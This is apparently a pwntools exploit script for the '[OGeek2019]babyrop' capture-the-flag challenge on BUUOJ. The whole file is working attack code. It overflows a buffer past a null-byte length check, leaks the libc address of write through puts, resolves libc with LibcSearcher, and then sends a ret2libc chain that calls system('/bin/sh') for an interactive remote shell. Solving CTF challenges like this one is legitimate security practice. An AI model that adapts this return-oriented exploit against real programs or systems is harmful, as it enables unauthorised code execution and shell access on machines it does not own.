from LibcSearcher import LibcSearcher
from pwn import *


def babyrop(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/[OGeek2019]babyrop'):
    context(log_level='debug', arch='i386', os='linux')
    target = process([file_name])
    target = remote('node5.buuoj.cn', 25760)
    target_elf = ELF(file_name)

    puts_plt = p32(target_elf.plt['puts'])
    write_got = p32(target_elf.got['write'])
    vulner_func_addr = p32(0x80487D0)

    pop_ret_gadget = p32(0x08048519)  # pop ebx ; ret

    target.sendline(b'\x00\x00\x00\x00\x00\x00\x00\xff')

    payload_1 = b'A' * (231 + 4)

    # puts(write_got)
    payload_1 += puts_plt + pop_ret_gadget + write_got
    # vulner_func(0xff)
    payload_1 += vulner_func_addr + pop_ret_gadget + b'\xff'

    target.sendline(payload_1)
    print(target.recvline())
    write_addr = u32(target.recv(4))
    print('write_addr: %x' % write_addr)

    searcher = LibcSearcher('write', write_addr)

    libc_base_addr = write_addr - searcher.dump('write')
    system_addr = p32(libc_base_addr + searcher.dump('system'))
    bin_sh_str = p32(libc_base_addr + searcher.dump('str_bin_sh'))

    payload_2 = b'A' * (231 + 4)
    # system(/bin/sh)
    payload_2 += system_addr + pop_ret_gadget + bin_sh_str

    target.sendline(payload_2)

    target.interactive()


if __name__ == '__main__':
    babyrop()
